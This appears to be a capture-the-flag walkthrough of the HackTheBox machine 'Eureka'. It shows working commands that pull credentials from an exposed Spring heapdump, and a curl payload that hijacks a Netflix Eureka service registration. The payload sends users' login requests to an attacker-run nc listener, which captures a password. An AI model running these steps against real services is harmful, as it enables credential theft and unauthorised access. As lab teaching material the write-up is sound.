![](https://github.com/user-attachments/assets/4706fb6b-7532-431b-9409-9f4a6f5fa460)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.66
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 14:35 +08
Warning: 10.10.11.66 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.66
Host is up (0.0065s latency).
Not shown: 65135 closed tcp ports (reset), 397 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8761/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80,8761 -sCV 10.10.11.66
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 14:35 +08
Nmap scan report for 10.10.11.66
Host is up (0.0061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8761/tcp open  http    Apache Tomcat (language: en)
| http-auth:
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
```

## 2. Web enumeration

### 2.1. Scanning for information

[Nuclei](https://docs.projectdiscovery.io/opensource/nuclei/overview) is a fast vulnerability scanner designed to probe modern applications, infrastructure, cloud platforms, and networks, aiding in the identification and mitigation of exploitable vulnerabilities.

The HTTP endpoint redirects to http://furni.htb/

Add `furni.htb` and use `nuclei` against it

![](https://github.com/user-attachments/assets/7333b2c1-9a78-40ff-8b78-d1fbd8612617)

### 2.2. Investigate heapdump with [JDumpSpider](https://github.com/whwlsfb/JDumpSpider)

Nuclei conveniently highlights **critical** findings in red, let's download the heapdump at http://furni.htb/actuator/heapdump:

```sh
curl -sLO http://furni.htb/actuator/heapdump
```

Go to [JDumpSpider Releases](https://github.com/whwlsfb/JDumpSpider/releases) and download `JDumpSpider-1.1-SNAPSHOT-full.jar`:

```sh
curl -sLO https://github.com/whwlsfb/JDumpSpider/releases/download/dev-20250409T071858/JDumpSpider-1.1-SNAPSHOT-full.jar
```

Run JDumpSpider against the heapdump file:

```console
root@kali:~# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
===========================================
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190

===========================================
WeblogicDataSourceConnectionPoolConfig
-------------
not found!

===========================================
MongoClient
-------------
not found!

===========================================
AliDruidDataSourceWrapper
-------------
not found!

===========================================
HikariDataSource
-------------
java.lang.NumberFormatException: Cannot parse null string
not found!

===========================================
RedisStandaloneConfiguration
-------------
not found!

===========================================
JedisClient
-------------
not found!

===========================================
CookieRememberMeManager(ShiroKey)
-------------
not found!

===========================================
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc
spring.jpa.hibernate.ddl-auto = none

===========================================
MutablePropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
local.server.port = null
spring.cloud.client.hostname = eureka

===========================================
MapPropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
spring.cloud.client.hostname = eureka
local.server.port = null

===========================================
ConsulPropertySources
-------------
not found!

===========================================
JavaProperties
-------------
not found!

===========================================
ProcessEnvironment
-------------
not found!

===========================================
OSS
-------------
org.jboss.logging.provider = slf4j

===========================================
UserPassSearcher
-------------
org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter:
[oauth2LoginEnabled = false, passwordParameter = password, formLoginEnabled = true, usernameParameter = username, loginPageUrl = /login, authenticationUrl = /login, saml2LoginEnabled = false, failureUrl = /login?error]
[oauth2LoginEnabled = false, formLoginEnabled = false, saml2LoginEnabled = false]

org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter:
[passwordParameter = password, usernameParameter = username]

org.antlr.v4.runtime.atn.LexerATNConfig:
[passedThroughNonGreedyDecision = false]

org.antlr.v4.runtime.atn.ATNDeserializationOptions:
[generateRuleBypassTransitions = false]

org.hibernate.boot.internal.InFlightMetadataCollectorImpl:
[inSecondPass = false]

com.mysql.cj.protocol.a.authentication.AuthenticationLdapSaslClientPlugin:
[firstPass = true]

com.mysql.cj.protocol.a.authentication.CachingSha2PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.protocol.a.authentication.Sha256PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.NativeCharsetSettings:
[platformDbCharsetMatches = true]

com.mysql.cj.protocol.a.NativeAuthenticationProvider:
[database = Furni_WebApp_DB, useConnectWithDb = true, serverDefaultAuthenticationPluginName = mysql_native_password, username = oscar190]

com.mysql.cj.jdbc.ConnectionImpl:
[password = 0sc@r190_S0l!dP@sswd, database = Furni_WebApp_DB, origHostToConnectTo = localhost, user = oscar190]

com.mysql.cj.conf.HostInfo:
[password = 0sc@r190_S0l!dP@sswd, host = localhost, user = oscar190]

com.zaxxer.hikari.pool.HikariPool:
[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]

org.springframework.cloud.netflix.eureka.EurekaClientConfigBean:
[eurekaServerConnectTimeoutSeconds = 5, useDnsForFetchingServiceUrls = false, eurekaServerReadTimeoutSeconds = 8, eurekaServerTotalConnections = 200, eurekaServiceUrlPollIntervalSeconds = 300, eurekaServerTotalConnectionsPerHost = 50]

org.springframework.boot.autoconfigure.security.SecurityProperties$User:
[password = 4312eecb-54e8-46b9-a645-5b9df3ea21d8, passwordGenerated = true]

org.springframework.boot.autoconfigure.jdbc.DataSourceProperties:
[password = 0sc@r190_S0l!dP@sswd, driverClassName = com.mysql.cj.jdbc.Driver, url = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]

org.springframework.security.authentication.dao.DaoAuthenticationProvider:
[hideUserNotFoundExceptions = true]

com.zaxxer.hikari.HikariDataSource:
[keepaliveTime = 0, password = 0sc@r190_S0l!dP@sswd, jdbcUrl = jdbc:mysql://localhost:3306/Furni_WebApp_DB, driverClassName = com.mysql.cj.jdbc.Driver, username = oscar190]

org.apache.catalina.startup.Tomcat:
[hostname = localhost]


===========================================
CookieThief
-------------
not found!

===========================================
AuthThief
-------------
java.util.LinkedHashMap$Entry:
org.springframework.security.config.annotation.authentication.configuration.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer = o.s.s.c.a.a.c.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer
org.springframework.security.config.annotation.authentication.configuration.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer = o.s.s.c.a.a.c.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer


===========================================
```

Credentials found:
- username: `oscar190`
- password: `0sc@r190_S0l!dP@sswd`

### 2.3. SSH as oscar190

Use the credentials found to logon to target, but the user flag is not here

```console
root@kali:~# ssh oscar190@10.10.11.66
Warning: Permanently added '10.10.11.66' (ED25519) to the list of known hosts.
oscar190@10.10.11.66's password:
⋮
oscar190@eureka:~$ cat user.txt
cat: user.txt: No such file or directory
oscar190@eureka:~$ id
uid=1000(oscar190) gid=1001(oscar190) groups=1001(oscar190)
oscar190@eureka:~$ ll
total 32
drwxr-x--- 5 oscar190 oscar190 4096 Apr  1 12:57 ./
drwxr-xr-x 4 root     root     4096 Aug  9  2024 ../
lrwxrwxrwx 1 oscar190 oscar190    9 Aug  7  2024 .bash_history -> /dev/null
-rw-r--r-- 1 oscar190 oscar190  220 Aug  1  2024 .bash_logout
-rw-r--r-- 1 oscar190 oscar190 3771 Apr  1 12:57 .bashrc
drwx------ 2 oscar190 oscar190 4096 Aug  1  2024 .cache/
drwx------ 3 oscar190 oscar190 4096 Aug  1  2024 .config/
drwxrwxr-x 3 oscar190 oscar190 4096 Aug  1  2024 .local/
lrwxrwxrwx 1 oscar190 oscar190    9 Aug  7  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 oscar190 oscar190  807 Aug  1  2024 .profile
```

## 3. Checking HTTP on `8761`

Recall from the nmap results that Apache Tomcat is running on `8761`, but the HTTP response was `401` (Unauthorized)

### 3.1. Finding access to `8761`

Let's revisit the heapdump file again

The `strings` command extracts printable character sequences from binary files or any file that might contain non-text data
- **Purpose**: To find readable text inside binary or mixed-content files.
- **Default Behavior**: It looks for sequences of at least 4 printable ASCII characters.
- **Use Case**: Useful for inspecting executables, logs, or corrupted files to find human-readable content.

Using `strings` to look for `8761` reveals that the endpoint is accessible via `localhost` only

Credentials were also found:
- username: `EurekaSrvr`
- password: `0scarPWDisTheB3st`

```console
root@kali:~# strings heapdump | grep 8761 -n
227464:P`http://localhost:8761/eureka/
344576:http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
366651:http://localhost:8761/eureka/!
442796:http://localhost:8761/eureka/!
450355:Host: localhost:8761
450870:http://localhost:8761/eureka/!
451153:Host: localhost:8761
```

Use `oscar190` to port map `8761` to the kali machine:

```sh
ssh -N -f -L 0.0.0.0:8761:127.0.0.1:8761 oscar190@10.10.11.66
```

### 3.2. Accessing `8761`

Login with the `EurekaSrvr` credential found from the heapdump:

![](https://github.com/user-attachments/assets/5fdc96e1-3b34-477c-8a2a-4e6cdb803caf)

![](https://github.com/user-attachments/assets/aba1a8b1-a39e-4472-a97d-714f78b3ed16)

### 3.3. Hacking Eureka

[Netflix Eureka](https://github.com/Netflix/eureka) is a RESTful (Representational State Transfer) service that is primarily used in the AWS cloud for the purpose of discovery, load balancing and failover of middle-tier servers. It plays a critical role in Netflix mid-tier infra.

Googling on Eureka reveal a [hacking guide](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka)

The endpoint at http://localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE can be manipulated to project sensitive information to `localhost:USER-MANAGEMENT-SERVICE:8081`

![](https://github.com/user-attachments/assets/b28f20fb-bfb2-4f40-8fc0-73454c678dbf)

Setup a listener on kali: `nc -nvlp 8081`

Sending the payload with kali's IP address:

```console
oscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.xx.xx",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.xx.xx",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```

Wait a while (~10 mins) for the information to come through the listener:

```console
root@kali:~# nc -nvlp 8081
listening on [any] 8081 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.66] 40340
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=ZTE1NjI2NDMtNjkwOC00YzIxLTlmZTAtMGM4YmY2ZTQ1N2Iy
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:39564"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.6:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=1hwcxDqcZCAKBMXLkIyzkgHSLxslKfP9BuAgrMfyXQgawLAnt38k9QmlVxInZvSooqGHqjK0AiIRTJXQN9ESnaGTOD559dQQ
```

Credentials found:
- username: `miranda.wise%40furni.htb`
- password: `IL%21veT0Be%26BeT0L0ve`

The information looks to be URL encoded (`%40` is `@`), so the credentials are actually:
- username: `miranda.wise@furni.htb`
- password: `IL!veT0Be&BeT0L0ve`

Attempting to SSH with `miranda.wise` fails, checking `/etc/passwd` shows that the user is `miranda-wise`

```console
oscar190@eureka:~$ tail /etc/passwd
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:115:119:MySQL Server,,,:/nonexistent:/bin/false
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

### 3.4. Login as miranda-wise and get user flag

```console
miranda-wise@eureka:~$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
miranda-wise@eureka:~$ cat user.txt
832f59a225328067d1d472f981240017
```
